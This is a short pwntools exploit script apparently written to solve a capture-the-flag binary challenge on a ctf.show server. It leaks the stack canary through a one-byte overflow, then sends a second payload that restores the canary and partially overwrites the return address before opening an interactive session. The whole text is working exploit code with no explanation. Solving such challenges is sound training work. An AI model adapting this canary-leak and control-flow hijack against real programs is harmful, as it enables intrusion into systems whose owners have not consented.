from pwn import*
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28164)
payload = 'a' * 41
io.sendafter('show:\n',payload)
io.recv(6 + 40)
canary = u64(io.recv(8)) & (0xffffffffffffff00)
log.success('canary:%x \n',canary)
payload = 'a' * 40 + p64(canary) + p64(0) + '\x42'
io.send(payload)
io.interactive()
